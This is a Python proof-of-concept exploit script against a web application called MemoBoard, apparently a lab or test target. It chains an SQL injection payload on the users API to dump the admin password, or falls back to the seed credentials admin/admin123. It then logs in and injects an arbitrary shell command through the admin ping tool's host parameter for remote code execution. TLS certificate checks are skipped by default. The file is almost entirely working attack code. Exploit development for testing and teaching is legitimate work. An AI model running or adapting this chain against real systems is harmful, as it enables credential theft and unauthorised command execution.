#!/usr/bin/env python3
"""PoC: MemoBoard admin ping command injection (RCE).

Chains: SQLi dump admin password → login as admin → ping RCE.
Also works standalone with known seed credentials admin/admin123.
"""
import argparse
import http.cookiejar
import json
import os
import ssl
import urllib.error
import urllib.parse
import urllib.request

MSGS = {
    "ssl_warn": (
        "[!] Warning: HTTPS target skips TLS certificate verification by default "
        "(common for IP access or self-signed certs); pass --strict-ssl for strict verification",
        "[!] 警告：HTTPS 目标默认跳过 TLS 证书校验（常见于 IP 访问或自签证书）；传入 --strict-ssl 可恢复严格校验",
    ),
    "sqli_start": (
        "No password provided — dumping admin credentials via SQLi...",
        "未提供密码 — 先通过 SQL 注入拖取管理员凭据...",
    ),
    "sqli_fail": ("SQLi request failed:", "SQL 注入请求失败:"),
    "sqli_ok": ("Admin password dumped via SQLi:", "已通过 SQL 注入拖取管理员密码:"),
    "sqli_fallback": (
        "Admin not found in SQLi results. Trying default admin/admin123.",
        "SQL 注入结果中未找到管理员。改用默认凭据 admin/admin123。",
    ),
    "sqli_not_json": (
        "SQLi response not JSON. Trying default admin/admin123.",
        "SQL 注入响应不是 JSON。改用默认凭据 admin/admin123。",
    ),
    "login": ("Logging in as", "正在登录"),
    "login_resp": ("Login response:", "登录响应:"),
    "login_fail": ("Login failed.", "登录失败。"),
    "rce_send": ("Sending RCE payload:", "发送 RCE 载荷:"),
    "rce_fail": ("RCE request failed:", "RCE 请求失败:"),
    "status": ("Status:", "状态:"),
    "response": ("Response:", "响应:"),
    "cmd_out": ("Command output:", "命令输出:"),
    "ok": (
        "SUCCESS: Command executed via ping command injection (RCE).",
        "成功：通过 ping 命令注入执行了命令（RCE）。",
    ),
    "no_out": (
        "Could not confirm command output in response.",
        "未能在响应中确认命令输出。",
    ),
}


def msg(key: str, zh: bool) -> str:
    en, zh_s = MSGS[key]
    return zh_s if zh else en


def never_bypass(host, **kwargs):
    return False


def ssl_context(*, strict: bool) -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    if strict:
        return ctx
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def opener(proxy: str, *, strict_ssl: bool):
    cj = http.cookiejar.CookieJar()
    handlers = [
        urllib.request.HTTPSHandler(context=ssl_context(strict=strict_ssl)),
        urllib.request.HTTPCookieProcessor(cj),
    ]
    if proxy:
        os.environ["no_proxy"] = ""
        os.environ["NO_PROXY"] = ""
        urllib.request.proxy_bypass = never_bypass
        if hasattr(urllib.request, "proxy_bypass_environment"):
            urllib.request.proxy_bypass_environment = never_bypass
        if hasattr(urllib.request, "proxy_bypass_registry"):
            urllib.request.proxy_bypass_registry = never_bypass
        handlers.insert(0, urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    return urllib.request.build_opener(*handlers)


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard RCE PoC (admin ping command injection)")
    p.add_argument("-u", "--url", required=True, help="Target origin, e.g. http://127.0.0.1:5000")
    p.add_argument("--proxy", default="", help="HTTP proxy, e.g. http://127.0.0.1:8080; empty=direct")
    p.add_argument(
        "--strict-ssl",
        action="store_true",
        help="Strict HTTPS certificate verification (default: skip mismatch/self-signed)",
    )
    p.add_argument("--zh", action="store_true", help="Print labels/status in Chinese (default: English)")
    p.add_argument("-c", "--cmd", default="id", help="Command to execute (RCE)")
    p.add_argument("-U", "--user", default="admin", help="Admin username (default: admin)")
    p.add_argument("-P", "--password", default="", help="Admin password; if empty, dumps via SQLi first")
    args = p.parse_args()
    zh = args.zh

    base = args.url.rstrip("/")
    if base.lower().startswith("https://") and not args.strict_ssl:
        print(msg("ssl_warn", zh))
    http = opener(args.proxy, strict_ssl=args.strict_ssl)

    password = args.password
    if not password:
        print(msg("sqli_start", zh))
        sqli_params = urllib.parse.urlencode({"name": "' OR 1=1 --"})
        sqli_url = f"{base}/api/users?{sqli_params}"
        req = urllib.request.Request(sqli_url, headers={"Accept": "application/json"})
        try:
            resp = http.open(req, timeout=15)
            body = resp.read().decode("utf-8", errors="replace")
        except Exception as e:
            print(msg("sqli_fail", zh), e)
            return 1
        try:
            data = json.loads(body)
            users = data.get("users", [])
            admin_user = next((u for u in users if u.get("role") == "admin"), None)
            if admin_user:
                password = admin_user.get("password", "")
                print(msg("sqli_ok", zh), password)
            else:
                print(msg("sqli_fallback", zh))
                password = "admin123"
        except json.JSONDecodeError:
            print(msg("sqli_not_json", zh))
            password = "admin123"

    print(msg("login", zh), args.user)
    login_data = json.dumps({"username": args.user, "password": password}).encode("utf-8")
    login_req = urllib.request.Request(
        f"{base}/api/login",
        data=login_data,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        resp = http.open(login_req, timeout=15)
        login_body = resp.read().decode("utf-8", errors="replace")
        print(msg("login_resp", zh), resp.status, login_body)
        if resp.status != 200:
            print(msg("login_fail", zh))
            return 1
    except urllib.error.HTTPError as e:
        print(msg("login_fail", zh), f"HTTP {e.code}")
        return 1

    payload = f";{args.cmd}"
    ping_params = urllib.parse.urlencode({"host": payload})
    ping_url = f"{base}/api/tools/ping?{ping_params}"
    print(msg("rce_send", zh), f"GET {ping_url}")
    ping_req = urllib.request.Request(ping_url, headers={"Accept": "text/plain"})
    try:
        resp = http.open(ping_req, timeout=15)
        status = resp.status
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read().decode("utf-8", errors="replace")
    except Exception as e:
        print(msg("rce_fail", zh), e)
        return 1

    print(msg("status", zh), status)
    print(msg("response", zh))
    print(body)

    lines = body.strip().split("\n")
    if len(lines) > 1 or (args.cmd and args.cmd.split()[0] in body):
        cmd_output = "\n".join(lines[1:]) if len(lines) > 1 else body
        print(f"\n{msg('cmd_out', zh)}")
        print(cmd_output)
        print(f"\n{msg('ok', zh)}")
        return 0
    print(f"\n{msg('no_out', zh)}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
